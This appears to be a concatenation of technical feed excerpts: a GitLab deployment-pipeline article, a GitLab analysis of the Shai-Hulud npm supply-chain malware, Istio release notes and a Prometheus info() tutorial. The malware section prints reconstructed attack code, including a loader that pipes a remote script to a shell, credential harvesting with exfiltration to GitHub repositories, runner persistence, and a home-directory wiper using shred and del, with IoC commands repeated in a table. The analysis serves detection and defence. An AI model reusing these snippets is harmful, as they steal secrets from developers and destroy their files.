are subject to a set of guidelines that Engineering must adhere to, which can be found in our <a href=\"https://docs.gitlab.com/development/multi_version_compatibility/\" rel=\"\">Multi-Version Compatibility documentation</a>.</p><h2 id=\"results-and-impact\">Results and impact</h2><p>Our deployment infrastructure delivers measurable benefits:</p><p><strong>For GitLab</strong></p><ul><li>Up to 12 deployments daily to GitLab.com</li><li>Zero-downtime deployments serving millions of developers</li><li>Security patches can reach production within hours, not days</li><li>New features validated in production at massive scale before general availability</li></ul><p><strong>For customers</strong></p><ul><li>Proven deployment patterns you can adopt for your own applications</li><li>Features battle-tested on the world's largest GitLab instance before reaching your environment</li><li>Documentation that reflects actual production practices, not theoretical best practices</li><li>Confidence that GitLab's recommended upgrade procedures work at any scale</li></ul><h2 id=\"key-takeaways-for-engineering-teams\">Key takeaways for engineering teams</h2><p>GitLab's deployment pipeline represents a sophisticated system that balances deployment velocity with operational reliability. The progressive deployment model, comprehensive testing integration, and robust rollback capabilities provide a foundation for reliable software delivery at scale.</p><p>For engineering teams implementing similar systems, key considerations include:</p><ul><li><strong>Automated testing:</strong> Comprehensive test coverage throughout the deployment pipeline</li><li><strong>Progressive rollout:</strong> Staged deployments to minimize risk and enable rapid recovery</li><li><strong>Monitoring integration:</strong> Comprehensive observability across all deployment stages</li><li><strong>Incident response:</strong> Rapid detection and resolution capabilities for deployment issues</li></ul><p>GitLab's architecture demonstrates how modern CI/CD systems can manage the complexity of large-scale deployments while maintaining the velocity required for competitive software development.</p><h2 id=\"important-note-on-scope\">Important note on scope</h2><p>This article specifically covers the deployment pipeline for services that are part of the <strong>GitLab Omnibus package</strong> and <strong>Helm chart</strong> — essentially the core GitLab monolith and its tightly integrated components.</p><p>However, GitLab's infrastructure landscape extends beyond what's described here.

Infected packages contain a modified <code>package.json</code> with a preinstall script pointing to <code>setup_bun.js</code>. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.</p><pre><code>// This file gets added to victim's packages as setup_bun.js\n#!/usr/bin/env node\nasync function downloadAndSetupBun() {\n  // Downloads and installs bun\n  let command = process.platform === 'win32'\n    ? 'powershell -c &quot;irm bun.sh/install.ps1|iex&quot;'\n    : 'curl -fsSL https://bun.sh/install | bash';\n\n  execSync(command, { stdio: 'ignore' });\n\n  // Runs the actual malware\n  runExecutable(bunPath, ['bun_environment.js']);\n}\n</code></pre><p>The <code>setup_bun.js</code> loader downloads or locates the Bun runtime on the system, then executes the bundled <code>bun_environment.js</code> payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.</p><h3 id=\"credential-harvesting\">Credential harvesting</h3><p>Once executed, the malware immediately begins credential discovery across multiple sources:</p><ul><li><strong>GitHub tokens</strong>: Searches environment variables and GitHub CLI configurations for tokens starting with <code>ghp_</code> (GitHub personal access token) or <code>gho_</code>(GitHub OAuth token)</li><li><strong>Cloud credentials</strong>: Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services</li><li><strong>npm tokens</strong>: Extracts tokens for package publishing from <code>.npmrc</code> files and environment variables, which are common locations for securely storing sensitive configuration and credentials.</li><li><strong>Filesystem scanning</strong>: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git history</li></ul><pre><code>async function scanFilesystem() {\n  let scanner = new Trufflehog();\n  await scanner.initialize();\n\n  // Scan user's home directory for secrets\n  let findings = await scanner.scanFilesystem(os.homedir());\n\n  // Upload findings to exfiltration repo\n  await github.saveContents(&quot;truffleSecrets.json&quot;,\n    JSON.stringify(findings));\n}\n</code></pre><h3 id=\"data-exfiltration-network\">Data exfiltration network</h3><p>The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: &quot;Sha1-Hulud: The Second Coming.&quot; These repositories serve as dropboxes for stolen credentials and system information.</p><pre><code>async function createRepo(name) {\n  // Creates a repository with a specific description marker\n  let repo = await this.octokit.repos.createForAuthenticatedUser({\n    name: name,\n    description: &quot;Sha1-Hulud: The Second Coming.&quot;, // Marker for finding repos later\n    private: false,\n    auto_init: false,\n    has_discussions: true\n  });\n\n  // Install GitHub Actions runner for persistence\n  if (await this.checkWorkflowScope()) {\n    let token = await this.octokit.request(\n      &quot;POST /repos/{owner}/{repo}/actions/runners/registration-token&quot;\n    );\n    await installRunner(token); // Installs self-hosted runner\n  }\n\n  return repo;\n}\n</code></pre><p>Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems.

On Unix systems, it uses <code>shred</code> to overwrite files before deletion, making recovery nearly impossible.</p><pre><code>// CRITICAL: Token validation failure triggers destruction\nasync function aL0() {\n  let githubApi = new dq();\n  let npmToken = process.env.NPM_TOKEN || await findNpmToken();\n\n  // Try to find or create GitHub access\n  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {\n    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos\n\n    if (!fetchedToken) {  // No GitHub access possible\n      if (npmToken) {\n        // Fallback to NPM propagation only\n        await El(npmToken);\n      } else {\n        // DESTRUCTION TRIGGER: No GitHub AND no NPM access\n        console.log(&quot;Error 12&quot;);\n        if (platform === &quot;windows&quot;) {\n          // Attempts to delete all user files and overwrite disk sectors\n          Bun.spawnSync([&quot;cmd.exe&quot;, &quot;/c&quot;,\n            &quot;del /F /Q /S \\&quot;%USERPROFILE%*\\&quot; &amp;&amp; &quot; +\n            &quot;for /d %%i in (\\&quot;%USERPROFILE%*\\&quot;) do rd /S /Q \\&quot;%%i\\&quot; &amp; &quot; +\n            &quot;cipher /W:%USERPROFILE%&quot;  // Overwrite deleted data\n          ]);\n        } else {\n          // Attempts to shred all writable files in home directory\n          Bun.spawnSync([&quot;bash&quot;, &quot;-c&quot;,\n            &quot;find \\&quot;$HOME\\&quot; -type f -writable -user \\&quot;$(id -un)\\&quot; -print0 | &quot; +\n            &quot;xargs -0 -r shred -uvz -n 1 &amp;&amp; &quot; +  // Overwrite and delete\n            &quot;find \\&quot;$HOME\\&quot; -depth -type d -empty -delete&quot;  // Remove empty dirs\n          ]);\n        }\n        process.exit(0);\n      }\n    }\n  }\n}\n</code></pre><p>This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.</p><h2 id=\"indicators-of-compromise\">Indicators of compromise</h2><p>To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.</p><table><thead><tr><th align=\"left\">Type</th><th align=\"left\">Indicator</th><th align=\"left\">Description</th></tr></thead><tbody><tr><td align=\"left\"><strong>file</strong></td><td align=\"left\"><code>bun_environment.js</code></td><td align=\"left\">Malicious post-install script in node_modules directories</td></tr><tr><td align=\"left\"><strong>directory</strong></td><td align=\"left\"><code>.truffler-cache/</code></td><td align=\"left\">Hidden directory created in user home for Trufflehog binary storage</td></tr><tr><td align=\"left\"><strong>directory</strong></td><td align=\"left\"><code>.truffler-cache/extract/</code></td><td align=\"left\">Temporary directory used for binary extraction</td></tr><tr><td align=\"left\"><strong>file</strong></td><td align=\"left\"><code>.truffler-cache/trufflehog</code></td><td align=\"left\">Downloaded Trufflehog binary (Linux/Mac)</td></tr><tr><td align=\"left\"><strong>file</strong></td><td align=\"left\"><code>.truffler-cache/trufflehog.exe</code></td><td align=\"left\">Downloaded Trufflehog binary (Windows)</td></tr><tr><td align=\"left\"><strong>process</strong></td><td align=\"left\"><code>del /F /Q /S &quot;%USERPROFILE%*&quot;</code></td><td align=\"left\">Windows destructive payload command</td></tr><tr><td align=\"left\"><strong>process</strong></td><td align=\"left\"><code>shred -uvz -n 1</code></td><td align=\"left\">Linux/Mac destructive payload command</td></tr><tr><td align=\"left\"><strong>process</strong></td><td align=\"left\"><code>cipher /W:%USERPROFILE%</code></td><td align=\"left\">Windows secure deletion command in payload</td></tr><tr><td align=\"left\"><strong>command</strong></td><td align=\"left\"><code>curl -fsSL https://bun.sh/install | bash</code></td><td align=\"left\">Suspicious Bun installation during NPM package install</td></tr><tr><td align=\"left\"><strong>command</strong></td><td align=\"left\"><code>powershell -c &quot;irm bun.sh/install.ps1|iex&quot;</code></td><td align=\"left\">Windows Bun installation via PowerShell</td></tr></tbody></table><h2 id=\"how-gitlab-can-help-you-detect-this-malware-campaign\">How GitLab can help you detect this malware campaign</h2><p>If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.</p><p>First, enable <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/\" rel=\"\"><strong>Dependency Scanning</strong></a> to automatically analyze your project's dependencies against known vulnerability databases. <strong>If infected packages are present in your <code>package-lock.json</code> or <code>yarn.lock</code> files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report.</strong> For complete setup instructions, refer to the <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/#enabling-the-analyzer\" rel=\"\">Dependency Scanning documentation</a>.</p><p>Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.</p><p>Next, <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/\" rel=\"\"><strong>GitLab Duo Chat</strong></a> can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/security_analyst_agent/\" rel=\"\">Security Analyst Agent</a> and simply ask questions like:</p><ul><li>&quot;Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?&quot;</li><li>&quot;Does this project have any npm supply chain vulnerabilities?&quot;</li><li>&quot;Does this project have any npm supply chain vulnerabilities?&quot;</li><li>&quot;Show me critical vulnerabilities in my JavaScript dependencies.&quot;</li></ul><p>The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.</p><p><img alt=\"GitLab Security Analyst Agent findings\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1764196041/ciwroqeub2ayhjcbajec.png\" /></p><p>For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.</p><h2 id=\"looking-ahead\">Looking ahead</h2><p>This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.</p><p>GitLab's automated detection systems continue to monitor for new infections and variations of this attack.

      "summary": "<p>According to Istio&rsquo;s <a href=\"https://istio.io/docs/releases/supported-releases/#support-policy\">support policy</a>, minor releases like 1.26 are supported until six weeks after the N+2 minor release (1.28 in this case). <a href=\"https://istio.io/news/releases/1.28.x/announcing-1.28/\">Istio 1.28 was released on the 5th of November, 2025</a>, and support for 1.26 will end on the 19th of December, 2025.</p>\n<p>At that point we will stop back-porting fixes for security issues and critical bugs to 1.26, so we encourage you to upgrade to the latest version of Istio (1.28.2). If you don&rsquo;t do this you may put yourself in the position of having to do a major upgrade on a short timeframe to pick up a critical fix.</p>\n<p>We care about you and your clusters, so please be kind to yourself and upgrade.</p>",

 <div class=\"content\">Istio 1.28.0 is officially supported on Kubernetes versions 1.29 to 1.34.</div>\n    </aside>\n</div>\n\n<h2 id=\"whats-new\">What’s new?</h2>\n<h3 id=\"inference-extension-support\">Inference Extension Support</h3>\n<p>Istio 1.28 continues to build on the Gateway API Inference Extension support with the introduction of <code>InferencePool</code> v1. This enhancement provides better management and routing of AI inference workloads, making it easier to deploy and scale Generative AI models on Kubernetes with intelligent traffic management.</p>\n<p>The <code>InferencePool</code> v1 API offers improved stability and functionality for managing pools of inference endpoints, enabling more sophisticated load balancing and failover strategies for AI workloads.</p>\n<h3 id=\"ambient-multicluster\">Ambient Multicluster</h3>\n<p>Istio 1.28 brings significant improvements to ambient multicluster deployments. Waypoints can now route traffic to remote networks in ambient multicluster configurations, expanding ambient capabilities. This enhancement enables outlier detection and other L7 policies for requests crossing networks, making it easier to manage multi-network service mesh deployments.</p>\n<p>Ambient multicluster remains an alpha feature and there are several known issues that will be addressed in future releases. If the recent changes negatively impacted your ambient multicluster deployment, it&rsquo;s possible to disable the recent waypoint behavior change by setting <code>AMBIENT_ENABLE_MULTI_NETWORK_WAYPOINT</code> pilot environment variable to <code>false</code>.</p>\n<p>We welcome feedback and bug reports from early adopters of ambient multicluster.</p>\n<h3 id=\"native-nftables-support-in-ambient-mode\">Native nftables Support in Ambient Mode</h3>\n<p>Istio 1.28 introduces support for native nftables when using ambient mode. This significant enhancement allows you to use nftables instead of iptables to manage network rules, providing a more flexible rule management. To enable nftables mode, use <code>--set values.global.nativeNftables=true</code> when installing Istio.</p>\n<p>This addition complements the existing nftables support in sidecar mode, ensuring Istio stays current with modern Linux networking frameworks.</p>\n<h3 id=\"dual-stack-support-promoted-to-beta\">Dual-stack Support Promoted to Beta</h3>\n<p>Istio&rsquo;s dual-stack networking support has been promoted to beta in this release. This advancement provides robust IPv4/IPv6 networking capabilities, enabling organizations to deploy Istio in modern network environments that require both IP protocol versions.</p>\n<h3 id=\"enhanced-security-features\">Enhanced Security Features</h3>\n<p>This release includes several important security improvements:</p>\n<ul>\n<li><strong>Enhanced JWT Authentication</strong>: Improved JWT filter configuration now supports custom space-delimited claims in addition to default claims like &ldquo;scope&rdquo; and &ldquo;permission&rdquo;. This enhancement ensures proper validation of JWT tokens with custom claims using the <code>spaceDelimitedClaims</code> field in <code>RequestAuthentication</code> resources</li>\n<li><strong><code>NetworkPolicy</code> Support</strong>: Optional <code>NetworkPolicy</code> deployment for istiod with <code>global.networkPolicy.enabled=true</code></li>\n<li><strong>Enhanced Container Security</strong>: Support for configuring <code>seccompProfile</code> in istio-validation and istio-proxy containers for better security compliance</li>\n<li><strong>Gateway API Security</strong>: Support for <code>FrontendTLSValidation</code> (GEP-91) enabling mutual TLS ingress gateway configurations</li>\n<li><strong>Improved Certificate Handling</strong>: Better root certificate parsing that filters out malformed certificates instead of rejecting the entire bundle</li>\n</ul>\n<h3 id=\"gateway-api-and-traffic-management-enhancements\">Gateway API and Traffic Management Enhancements</h3>\n<ul>\n<li><strong><code>BackendTLSPolicy</code> v1</strong>: Full Gateway API v1.4 support with enhanced TLS configuration options</li>\n<li><strong><code>ServiceEntry</code> Integration</strong>: Support for <code>ServiceEntry</code> as a <code>targetRef</code> in <code>BackendTLSPolicy</code> for external service TLS configuration</li>\n<li><strong>Wildcard Host Support</strong>: <code>ServiceEntry</code> resources now support wildcard hosts with <code>DYNAMIC_DNS</code> resolution (HTTP traffic only, requires ambient mode and waypoint)</li>\n</ul>\n<h3 id=\"plus-much-more\">Plus Much More</h3>\n<ul>\n<li><strong>Persona-based Installations</strong>: New <code>resourceScope</code> option in Helm charts for namespace or cluster-scoped resource management</li>\n<li><strong>Improved Load Balancing</strong>: Cookie attributes support in consistent hash load-balancing with security options like <code>SameSite</code>, <code>Secure</code>, and <code>HttpOnly</code></li>\n<li><strong>Enhanced Telemetry</strong>: Dual B3/W3C header propagation support for better tracing interoperability</li>\n<li><strong>istioctl Improvements</strong>: Automatic default revision detection and enhanced debugging capabilities</li>\n</ul>\n<p>Read about these and more in the full <a href=\"/news/releases/1.28.x/announcing-1.28/change-notes/\">release notes</a>.</p>\n<h2 id=\"upgrading-to-128\">Upgrading to 1.28</h2>\n<p>We would like to hear from you regarding your experience upgrading to Istio 1.28. You can provide feedback in the <code>#release-1.28</code> channel in our <a href=\"https://slack.istio.io/\">Slack workspace</a>.</p>\n<p>Would you like to contribute directly to Istio?

      "summary": "<p>Enriching metrics with metadata labels can be surprisingly tricky in Prometheus, even if you're a PromQL wiz!\nThe PromQL join query traditionally used for this is inherently quite complex because it has to specify the labels to join on, the info metric to join with, and the labels to enrich with.\nThe new, still experimental <code>info()</code> function, promises a simpler way, making label enrichment as simple as wrapping your query in a single function call.</p>\n<p>In Prometheus 3.0, we introduced the <a href=\"https://prometheus.io/docs/prometheus/latest/querying/functions/#info\"><code>info()</code></a> function, a powerful new way to enrich your time series with labels from info metrics.\nWhat's special about <code>info()</code> versus the traditional join query technique is that it relieves you from having to specify <em>identifying labels</em>, which info metric(s) to join with, and the (\"data\" or \"non-identifying\") labels to enrich with.\nNote that \"identifying labels\" in this particular context refers to the set of labels that identify the info metrics in question, and are shared with associated non-info metrics.\nThey are the labels you would join on in a Prometheus <a href=\"https://grafana.com/blog/2021/08/04/how-to-use-promql-joins-for-more-effective-queries-of-prometheus-metrics-at-scale\">join query</a>.\nConceptually, they can be compared to <a href=\"https://en.wikipedia.org/wiki/Foreign_key\">foreign keys</a> in relational databases.</p>\n<p>Beyond the main functionality, <code>info()</code> also solves a subtle yet critical problem that has plagued join queries for years: The \"churn problem\" that causes queries to fail when non-identifying info metric labels change, combined with missing staleness marking (as is the case with OTLP ingestion).</p>\n<p>Whether you're working with OpenTelemetry resource attributes, Kubernetes labels, or any other metadata, the <code>info()</code> function makes your PromQL queries cleaner, more reliable, and easier to understand.</p>\n<h2>The Problem: Complex Joins and The Churn Problem</h2>\n<p>Let us start by looking at what we have had to do until now.\nImagine you're monitoring HTTP request durations via OpenTelemetry and want to break them down by Kubernetes cluster.\nYou push your metrics to Prometheus' OTLP endpoint.\nYour metrics have <code>job</code> and <code>instance</code> labels, but the cluster name lives in a separate <code>target_info</code> metric, as the <code>k8s_cluster_name</code> label.\nHere's what the traditional approach looks like:</p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name)\n    target_info\n)\n</code></pre>\n<p>While this works, there are several issues:</p>\n<p><strong>1. Complexity:</strong> You need to know:</p>\n<ul>\n<li>Which info metric contains your labels (<code>target_info</code>)</li>\n<li>Which labels are the \"identifying\" labels to join on (<code>job</code>, <code>instance</code>)</li>\n<li>Which data labels you want to add (<code>k8s_cluster_name</code>)</li>\n<li>The proper PromQL join syntax (<code>on</code>, <code>group_left</code>)</li>\n</ul>\n<p>This requires expert-level PromQL knowledge and makes queries harder to read and maintain.</p>\n<p><strong>2. The Churn Problem (The Critical Issue):</strong></p>\n<p>Here's the subtle but serious problem: What happens when an OTel resource attribute changes in a Kubernetes container, while the identifying resource attributes stay the same?\nAn example could be the resource attribute <code>k8s.pod.labels.app.kubernetes.io/version</code>.\nThen the corresponding <code>target_info</code> label <code>k8s_pod_labels_app_kubernetes_io_version</code> changes, and Prometheus sees a completely new <code>target_info</code> time series.</p>\n<p>As the OTLP endpoint doesn't mark the old <code>target_info</code> series as stale, both the old and new series can exist simultaneously for up to 5 minutes (the default lookback delta).\nDuring this overlap period, your join query finds <strong>two distinct matching <code>target_info</code> time series</strong> and fails with a \"many-to-many matching\" error.</p>\n<p>This could in practice mean your dashboards break and your alerts stop firing when infrastructure changes are happening, perhaps precisely when you would need visibility the most.</p>\n<h3>The Info Function Presents a Solution</h3>\n<p>The previous join query can be converted to use the <code>info</code> function as follows:</p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n  info(rate(http_server_request_duration_seconds_count[2m]))\n)\n</code></pre>\n<p>Much more comprehensible, isn't it?\nAs regards solving the churn problem, the real magic happens under the hood: <strong><code>info()</code> automatically selects the time series with the latest sample</strong>, eliminating churn-related join failures entirely.\nNote that this call to <code>info()</code> returns all data labels from <code>target_info</code>, but it doesn't matter because we aggregate them away with <code>sum</code>.</p>\n<h2>Basic Syntax</h2>\n<pre><code class=\"language-promql\">info(v instant-vector, [data-label-selector instant-vector])\n</code></pre>\n<ul>\n<li><strong><code>v</code></strong>: The instant vector to enrich with metadata labels</li>\n<li><strong><code>data-label-selector</code></strong> (optional): Label matchers in curly braces to filter which labels to include</li>\n</ul>\n<p>In its most basic form, omitting the second parameter, <code>info()</code> adds <strong>all</strong> data labels from <code>target_info</code>:</p>\n<pre><code class=\"language-promql\">info(rate(http_server_request_duration_seconds_count[2m]))\n</code></pre>\n<p>Through the second parameter on the other hand, you can control which data labels to include from <code>target_info</code>:</p>\n<pre><code class=\"language-promql\">info(\n  rate(http_server_request_duration_seconds_count[2m]),\n  {k8s_cluster_name=~\".+\"}\n)\n</code></pre>\n<p>In the example above, <code>info()</code> includes the <code>k8s_cluster_name</code> data label from <code>target_info</code>.\nBecause the selector matches any non-empty string, it will include any <code>k8s_cluster_name</code> label value.</p>\n<p>It's also possible to filter which <code>k8s_cluster_name</code> label values to include:</p>\n<pre><code class=\"language-promql\">info(\n  rate(http_server_request_duration_seconds_count[2m]),\n  {k8s_cluster_name=\"us-east-0\"}\n)\n</code></pre>\n<h2>Selecting Different Info Metrics</h2>\n<p>By default, <code>info()</code> uses the <code>target_info</code> metric.\nHowever, you can select different info metrics (like <code>build_info</code> or <code>node_uname_info</code>) by including a <code>__name__</code> matcher in the data-label-selector:</p>\n<pre><code class=\"language-promql\"># Use build_info instead of target_info\ninfo(up, {__name__=\"build_info\"})\n\n# Use multiple info metrics (combines labels from both)\ninfo(up, {__name__=~\"(target|build)_info\"})\n\n# Select build_info and only include the version label\ninfo(up, {__name__=\"build_info\", version=~\".+\"})\n</code></pre>\n<p><strong>Note:</strong> The current implementation always uses <code>job</code> and <code>instance</code> as the identifying labels for joining, regardless of which info metric you select.\nThis works well for most standard info metrics but may have limitations with custom info metrics that use different identifying labels.\nAn example of an info metric that has different identifying labels than <code>job</code> and <code>instance</code> is <code>kube_pod_labels</code>, its identifying labels are instead: <code>namespace</code> and <code>pod</code>.\nThe intention is that <code>info()</code> in the future knows which metrics in the TSDB are info metrics and automatically uses all of them, unless the selection is explicitly restricted by a name matcher like the above, and which are the identifying labels for each info metric.</p>\n<h2>Real-World Use Cases</h2>\n<h3>OpenTelemetry Integration</h3>\n<p>The primary driver for the <code>info()</code> function is <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">OpenTelemetry</a> (OTel) integration.\nWhen using Prometheus as an OTel backend, resource attributes (metadata about the metrics producer) are automatically converted to the <code>target_info</code> metric:</p>\n<ul>\n<li><code>service.instance.id</code> → <code>instance</code> label</li>\n<li><code>service.name</code> → <code>job</code> label</li>\n<li><code>service.namespace</code> → prefixed to <code>job</code> (i.e., <code>&#x3c;namespace>/&#x3c;service.name></code>)</li>\n<li>All other resource attributes → data labels on <code>target_info</code></li>\n</ul>\n<p>This means that, so long as at least either the <code>service.instance.id</code> or the <code>service.name</code> resource attribute is included, every OTel metric you send to Prometheus over OTLP can be enriched with resource attributes using <code>info()</code>:</p>\n<pre><code class=\"language-promql\"># Add all OTel resource attributes\ninfo(rate(http_server_request_duration_seconds_sum[5m]))\n\n# Add only specific attributes\ninfo(\n  rate(http_server_request_duration_seconds_sum[5m]),\n  {k8s_cluster_name=~\".+\", k8s_namespace_name=~\".+\", k8s_pod_name=~\".+\"}\n)\n</code></pre>\n<h3>Build Information</h3>\n<p>Enrich your metrics with build-time information:</p>\n<pre><code class=\"language-promql\"># Add version and branch information to request rates\nsum by (job, http_status_code, version, branch) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {__name__=\"build_info\"}\n  )\n)\n</code></pre>\n<h3>Filter on Producer Version</h3>\n<p>Pick only metrics from certain producer versions:</p>\n<pre><code class=\"language-promql\">sum by (job, http_status_code, version) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {__name__=\"build_info\", version=~\"2\\\\..+\"}\n  )\n)\n</code></pre>\n<h2>Before and After: Side-by-Side Comparison</h2>\n<p>Let's see how the <code>info()</code> function simplifies real queries:</p>\n<h3>Example 1: OpenTelemetry Resource Attribute Enrichment</h3>\n<p><strong>Traditional approach:</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name, k8s_namespace_name, k8s_container_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name, k8s_namespace_name, k8s_container_name)\n    target_info\n)\n</code></pre>\n<p><strong>With info():</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name, k8s_namespace_name, k8s_container_name) (\n  info(rate(http_server_request_duration_seconds_count[2m]))\n)\n</code></pre>\n<p>The intent is much clearer with <code>info</code>: We're enriching <code>http_server_request_duration_seconds_count</code> with Kubernetes related OpenTelemetry resource attributes.</p>\n<h3>Example 2: Filtering by Label Value</h3>\n<p><strong>Traditional approach:</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n    rate(http_server_request_duration_seconds_count[2m])\n  * on (job, instance) group_left (k8s_cluster_name)\n    target_info{k8s_cluster_name=~\"us-.*\"}\n)\n</code></pre>\n<p><strong>With info():</strong></p>\n<pre><code class=\"language-promql\">sum by (http_status_code, k8s_cluster_name) (\n  info(\n    rate(http_server_request_duration_seconds_count[2m]),\n    {k8s_cluster_name=~\"us-.*\"}\n  )\n)\n</code></pre>\n<p>Here we filter to only include metrics from clusters in the US (which names start with <code>us-</code>). The <code>info()</code> version integrates the filter naturally into the data-label-selector.</p>\n<h2>Technical Benefits</h2>\n<p>Beyond the fundamental UX benefits, the <code>info()</code> function provides several technical advantages:</p>\n<h3>1. Automatic Churn Handling</h3>\n<p>As previously mentioned, <code>info()</code> automatically picks the matching info time series with the latest sample when multiple versions exist.\nThis eliminates the \"many-to-many matching\" errors that plague traditional join queries during churn.</p>\n<p><strong>How it works:</strong> When non-identifying info metric labels change (e.g., a pod is re-created), there's a brief period where both old and new series might exist.\nThe <code>info()</code> function simply selects whichever has the most recent sample, ensuring your queries keep working.</p>\n<h3>2. Better Performance</h3>\n<p>The <code>info()</code> function is more efficient than traditional joins:</p>\n<ul>\n<li>Only selects matching info series</li>\n<li>Avoids unnecessary label matching operations</li>\n<li>Optimized query execution path</li>\n</ul>\n<h2>Getting Started</h2>\n<p>The <code>info()</code> function is experimental and must be enabled via a feature flag:</p>\n<pre><code class=\"language-bash\">prometheus --enable-feature=promql-experimental-functions\n</code></pre>\n<p>Once enabled, you can start using it immediately.</p>\n<h2>Current Limitations and Future Plans</h2>\n<p>The current implementation is an <strong>MVP (Minimum Viable Product)</strong> designed to validate the approach and gather user feedback.\nThe implementation has some intentional limitations:</p>\n<h3>Current Constraints</h3>\n<ol>\n<li>\n<p><strong>Default info metric:</strong> Only considers <code>target_info</code> by default</p>\n<ul>\n<li>Workaround: You can use <code>__name__</code> matchers like <code>{__name__=~\"(target|build)_info\"}</code> in the data-label-selector, though this still assumes <code>job</code> and <code>instance</code> as identifying labels</li>\n</ul>\n</li>\n<li>\n<p><strong>Fixed identifying labels:</strong> Always assumes <code>job</code> and <code>instance</code> are the identifying labels for joining</p>\n<ul>\n<li>This unfortunately makes <code>info()</code> unsuitable for certain scenarios, e.g. including data labels from <code>kube_pod_labels</code>, but it's a problem we want to solve in the future</li>\n</ul>\n</li>\n</ol>\n<h3>Future Development</h3>\n<p>These limitations are meant to be temporary.\nThe experimental status allows us to:</p>\n<ul>\n<li>Gather real-world usage feedback</li>\n<li>Understand which use cases matter the most</li>\n<li>Iterate on the design before committing to a final API</li>\n</ul>\n<p>A future version of the <code>info()</code> function should:</p>\n<ul>\n<li>Consider all info metrics by default (not just <code>target_info</code>)</li>\n<li>Automatically understand identifying labels based on info metric metadata</li>\n</ul>\n<p><strong>Important:</strong> Because this is an experimental feature, the behavior may change in future Prometheus versions, or the function could potentially be removed from PromQL entirely based on user feedback.</p>\n<h2>Giving Feedback</h2>\n<p>Your feedback will directly shape the future of this feature and help us determine whether it should become a permanent part of PromQL.\nFeedback may be provided e.g. through our <a href=\"https://prometheus.io/community/#community-connections\">community connections</a> or by opening a <a href=\"https://github.com/prometheus/prometheus/issues\">Prometheus issue</a>.</p>\n<p>We encourage you to try the <code>info()</code> function and share your feedback:</p>\n<ul>\n<li>What use cases does it solve for you?</li>\n<li>What additional functionality would you like to see?</li>\n<li>How could the API be improved?</li>\n<li>Do you see improved performance?</li>\n</ul>\n<h2>Conclusion</h2>\n<p>The experimental <code>info()</code> function represents a significant step forward in making PromQL more accessible and reliable.\nBy simplifying metadata label enrichment and automatically handling the churn problem, it removes two major pain points for Prometheus users, especially those adopting OpenTelemetry.</p>\n<p>To learn more:</p>\n<ul>\n<li><a href=\"https://prometheus.io/docs/prometheus/latest/querying/functions/#info\">PromQL functions documentation</a></li>\n<li><a href=\"https://prometheus.io/docs/guides/opentelemetry/\">OpenTelemetry guide (includes detailed info() usage)</a></li>\n<li><a href=\"https://github.com/prometheus/proposals/blob/main/proposals/0037-native-support-for-info-metrics-metadata.md\">Feature proposal</a></li>\n</ul>\n<p>Please feel welcome to share your thoughts with the Prometheus community on <a href=\"https://github.com/prometheus/prometheus/discussions\">GitHub Discussions</a> or get in touch with us on the <a href=\"https://cloud-native.slack.com/\">CNCF Slack #prometheus channel</a>.</p>\n<p>Happy querying!</p>",

